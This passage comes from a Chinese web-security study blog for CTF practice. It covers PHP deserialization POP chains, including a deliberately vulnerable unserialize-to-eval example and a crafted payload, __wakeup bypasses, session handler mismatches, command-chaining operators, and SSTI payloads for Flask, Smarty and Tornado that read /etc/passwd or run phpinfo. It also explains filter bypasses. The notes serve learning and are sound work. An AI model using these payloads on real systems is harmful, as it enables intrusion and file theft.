(2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候\n\n__invoke当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)\n\nclass User&#123;\n\n    public function __invoke()\n    &#123;\n       echo &#x27;__invoke test&#x27;;\n    &#125;\n\n&#125;\n\n$test = new User();\n$test();\n\n运行结果：\n__invoke test\n\n\n__clone当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 __clone() ，如果该魔术方法存在的话。\n\nclass User&#123;\n\n    public function __clone()\n    &#123;\n        echo \"__clone test\";\n    &#125;\n\n&#125;\n$test = new User();\n$newclass = clone($test);\n?>\n\n运行结果：\n__clone test\n\n\n__wakeup()函数绕过漏洞原理1.低版本的php\n\n\n\n\n\n\n\n\n当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。\n从而绕过了__wakeup()函数\n2.高一些的版本举个例子，\n\n\n\n\n\n\n\n\n\nC:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\nO:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\n关键是把O:改成C:，\n原理是\nC:代表这个类实现了serializeable接口，而serializeable不支持__wakeup，就绕过去了\n\n*popchain\n\n\n\n\n\n\n\n\n实际环境中不可能存在直接反序列化就能实现命令执行的情况，这个时候就要用到我们刚学到的一些魔术方法的相互触发，来构造一条popchain，从反序列化接口开始，一级一级的触发【所以就需要清楚各个魔术方法的触发情况】，最终到达我们目的想要执行的方法/函数\n\n*个人+一些文章对 php反序列化的一些认知举例\n\nclass index &#123;\n    private $test;\n    public function __construct()\n    &#123;\n        $this->test = new normal();\n    &#125;\n    public function __destruct()\n    &#123;\n        $this->test->action();\n    &#125;\n&#125;\nclass normal &#123;\n    public function action()&#123;\n        echo \"please attack me\";\n    &#125;\n&#125;\nclass evil &#123;\n    var $test2;\n    public function action()&#123;\n        eval($this->test2);\n    &#125;\n&#125;\nunserialize($_GET[&#x27;test&#x27;]);\n\n正常实例化后会执行normal类里面的action方法，但是unserialize函数是可控的，我们就可以对其进行攻击，思路就是改变index类里面test属性的值，让它实例化evil类，从而执行evil里面的action方法，同时我们也要修改evil类里面的test2属性的值\n\n因为类不同于函数，定义完之后无法直接使用，因为类只是一个抽象的概念，需要通过关键字new来实例化类，才可以使用。类实例化的语法格式如下：变量名&#x3D;new 类名（[构造函数]）。\n其中，变量名可以为任何PHP变量的名称，构造参数取决于类的构造函数，若无构造函数，则圆括号中为空。\n实例化一个类后即可使用该类\n\n\n\n\nclass index &#123;\n    private $test;\n    public function __construct()\n    &#123;\n        $this->test = new evil();\n    &#125;\n&#125;\n\nclass evil &#123;\n    var $test2 = &#x27;phpinfo();&#x27;;\n&#125;\n$a= new index();\nfile_put_contents(&#x27;serialize1.txt&#x27;,serialize($a));\n\n这里反序化的，先是\n$a= new $a= new index();\n\n实例化index()类，然后调动其test变量实例化evil)()，\n使其能够被调用，然后根据\neval(eval($this->test2);\n\n我们对test2变量进行赋值命令语句，使得我们可以利用其中的eval函数，执行一些命令来拿到我们所需要的内容\nvar $test2 = var $test2 = &#x27;phpinfo();&#x27;;\n\n最后对序列化的入口类(index.php)序列化，然后把序列化结果导入，再由源码中反序列化函数后，从而实现我们想要的结构\nunserialize($_GET[unserialize($_GET[&#x27;test&#x27;]);\n\n比如这里就是以GET方式传参test参数，\nurl/?test=序列化结果\n\n但是序列化的结果未必都是没有问题的，因为%00这个空字符是无法显示，只能输入进去\n以上面为例子，序列化后结果为\nO:5:\"index\":1:&#123;s:11:\"indextest\";O:4:\"evil\":1:&#123;s:5:\"test2\";s:10:\"phpinfo();\";&#125;&#125;\n\n如果用了这个是会报错的，\n\n因为这里的参数有问题\n&#123;s:11:\"indextest\"\n\n我们仔细看一下属性值是11，但是后面的indextest总共是9个字符，所以丢失了两个字符，这两个字符就是空字符%00\nO:5:\"index\":1:&#123;s:11:\"index%00test%00\";O:4:\"evil\":1:&#123;s:5:\"test2\";s:10:\"phpinfo();\";&#125;&#125;\n\n这里我们加上后再试试\n\n就实现了我们的目的操作\n当然其实还可能有的情况后面不是eval()的命令执行，可能是文件包含，或者其他操作，按这种思路走大都是没有问题的\nsession的反序列化漏洞session的反序列化漏洞，就是利用`php`处理器和`php_serialize`处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因\n\n\n\nPHP session序列化机制根据php.ini中的配置项，我们研究将$_SESSION中保存的所有数据序列化存储到PHPSESSID对应的文件中，使用的三种不同的处理格式，即session.serialize_handler定义的三种引擎：\n\n\n\n处理器\n对应的存储格式\n\n\n\nphp\n键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值\n\n\nphp_binary\n键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值\n\n\nphp_serialize (php&gt;&#x3D;5.5.4)\n经过 serialize() 函数反序列处理的数组\n\n\nphp处理器首先来看看默认session.serialize_handler = php时候的序列化结果，代码如下\n\n\n\n为了方便查看，将session存储目录设置为session.save_path = &quot;/www/php_session&quot;，PHPSESSID文件如下\n1、文件名\n文件名为sess_mpnnbont606f50eb178na451od，其中mpnnbont606f50eb178na451od就是后续请求头中Cookie携带的PHPSESSID的值 (如上图浏览器中已存储)\n2、文件内容\nphp处理器存储格式\n\n\n\n键名\n竖线\n经过 serialize() 函数反序列处理的值\n\n\n\n$_SESSION[‘name’]的键名：name\n|\ns:6:”harden”;\n\n\nphp_binary处理器使用php_binary处理器，即session.serialize_handler = php_binary\n\n\n由于三种方式PHPSESSID文件名都是一样的，这里只需要查看文件内容\n\n\n\n\n键名的长度对应的 ASCII 字符\n键名\n经过 serialize() 函数反序列处理的值.\n\n\n\n$\nnamenamenamenamenamenamenamenamename\ns:6:”harden”;\n\n\nphp_serialize 处理器使用php_binary处理器，即session.serialize_handler = php_serialize\n\n\n文件内容即经过 serialize() 函数反序列处理的数组，a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;\n\n十二、rce\n\n\n\n\n\n\n\n\n“|”:管道符，前面命令标准输出，后面命令的标准输入。例如：help |more\n“&amp;” commandA &amp; commandB 先运行命令A，然后运行命令B \n“||” commandA || commandB 运行命令A，如果失败则运行命令B \n“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B\n十三、ssti\n\n\n\n\n\n\n\n\n参考文章\n根据下图，推测不同的模板注入，然后使用不同的注入方法\n\n\n\n\n\n\n\n\n\n\n\n原文链接1\n原文链接2\n注，由于 转义内容 Hexo使用Nunjucks渲染帖子（较早的版本使用Swig，它们具有相似的语法）。用&#123; &#123; &#125; &#125;或&#123; ％ ％ &#125;包装的内容将被解析，并可能导致问题。您可以使用原始标签插件包装敏感内容。\n这里是把所有{  {}  }和 {  %% }，没有空格，替换成有空格的，才能上传博客\n关于基于flask的SSTI漏洞的阶段学习小结：SSTI的理解：SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。\nSSTI引发的真正原因：render_template渲染函数的问题\nrender_template渲染函数是什么：就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。\nrender_template：渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即：{  {}  }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{  {}  }包裹的内容当做变量解析替换。比如{  {1+1}  }会被解析成2。因此才有了现在的模板注入漏洞。往往变量我们使用{  {这里是内容}  }真因为{  {}  }包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞\n注入的思想：\n\n\n\n\n\n\n\n\n\n用函数不断调用我们要使用的命令如：file、read、open、ls等等命令，我们用这些来读取写入配置文件；\nSmarty SSTI利用Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。\n漏洞确认一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30\n常规利用方式{php}{&#x2F;php}标签Smarty支持使用{php}{&#x2F;php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{&#x2F;php}标签会报错：\n\n在Smarty3的官方手册里有以下描述:\n\n\n\n\n\n\n\n\n\nSmarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。\n该题目使用的是Smarty类，所以只能另寻它路。\n{literal} 标签官方手册这样描述这个标签：\n\n\n\n\n\n\n\n\n\n{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。\n那么对于php5的环境我们就可以使用\nphpinfo();\n\n来实现PHP代码的执行，但这道题的题目环境是PHP7，这种方法就失效了。\n静态方法通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。\nSmarty类的getStreamVariable方法的代码如下：\npublic function getStreamVariable($variable)&#123;        $_result = &#x27;&#x27;;        $fp = fopen($variable, &#x27;r+&#x27;);        if ($fp) &#123;            while  (!feof($fp) && ($current_line = fgets($fp)) !== false) &#123;                $_result .= $current_line;            &#125;            fclose($fp);            return $_result;        &#125;        $smarty =  isset($this->smarty) ? $this->smarty : $this;        if  ($smarty->error_unassigned) &#123;            throw new  SmartyException(&#x27;Undefined stream variable \"&#x27; . $variable . &#x27;\"&#x27;);        &#125; else &#123;            return null;        &#125;    &#125;\n\n可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，很多文章里给的payload都形如：{self::getStreamVariable(“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”)}。然而使用这个payload会触发报错如下：\nFatal error: Uncaught --> Smarty Compiler: Syntax error in template  \"string:Current  IP:&#123;self::getStreamVariable(‘file:///etc/passwd’)&#125;\" static class &#x27;self&#x27;  is undefined or not allowed by security setting \n\n可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。\n{if}标签官方文档中看到这样的描述：\n\n\n\n\n\n\n\n\n\nSmarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}. 也可以使用{else} 和 {elseif}. \n全部的PHP条件表达式和函数都可以在if内使用，如*||*, or, &amp;&amp;, and, is_array(), 等等\n既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？\n将XFF头改为{if phpinfo()}{&#x2F;if}，可以看到题目执行了phpinfo()\n\n用同样的方法可以轻松获得flag\n题目漏洞代码\n通过getshell之后的文件读取，本题中引发SSTI的代码简化后如下：\ndisplay(\"string:\".$ip);&#125;\n\n可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。\nTornado SSTI利用tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关\n\n\n\n\n\n\n\n\n\n Tornado模板支持控制语句和表达式。\n 控制语句被{ % % }, e.g. { % if len(items) &gt; 2 %}\n 表达式被{ { } }, e.g. { { items[0] } }.\nrender()是tornado里的函数，可以生成html模板。是一个渲染函数，就是一个公式，能输出前端页面的公式。\nTornado框架的附属文件handler.settings中存在cookie_secret\nHandler这个对象，Handler指向的处理当前这个页面的RequestHandler对象\n\n\n\n\n\n\n\n\n\nRequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性\nhandler 指向RequestHandler\n而RequestHandler.settings又指向self.application.settings\n所有handler.settings就指向RequestHandler.application.settings了！\n绕过过滤__proto__绕过\n\n\n\n\n\n\n\n\n__proto__被过滤，用constructor.prototype绕过\n在JavaScript中，每个对象都有一个名为 __proto__ 的内置属性，它指向该对象的原型。对象的原型是另一个对象，它有自己的 __proto__ 属性，指向它的原型，这样就形成了一条链，称为原型链。使用 __proto__ 属性可以访问和修改对象的原型。\n在某些情况下，开发人员可能希望过滤掉对象的 __proto__ 属性，以增强安全性或避免潜在的问题。但是，这并不意味着通过其他方式就无法访问对象的原型了。\nconstructor.prototype 是一种访问对象原型的替代方法。当创建一个函数时，会自动创建一个名为 prototype 的属性，并将其设置为一个空对象。当使用该函数作为构造函数创建新对象时，该对象的 __proto__ 属性将被设置为构造函数的 prototype 属性的值。因此，可以使用 constructor.prototype 访问该对象的原型，而无需使用 __proto__ 属性。\n尽管 constructor.prototype 可以绕过对 __proto__ 的过滤，但它本质上与 __proto__ 是相同的，因此也可能存在潜在的安全问题，需要在代码编写时进行注意。\n\n分隔符绕过\n\n\n\n\n\n\n\n\n利用模板渲染参数，将delimiter分割参数渲染覆盖，使得原有的标签从&lt;%=变成&lt;?=【http://xx/?delimiter=?】，故而正则匹配对&lt;%=的限制就绕过了\n","slug":"Web-study","date":"2022-05-28T08:01:29.902Z","categories_index":"网络安全学习","tags_index":"web","author_index":"Ttoc"}]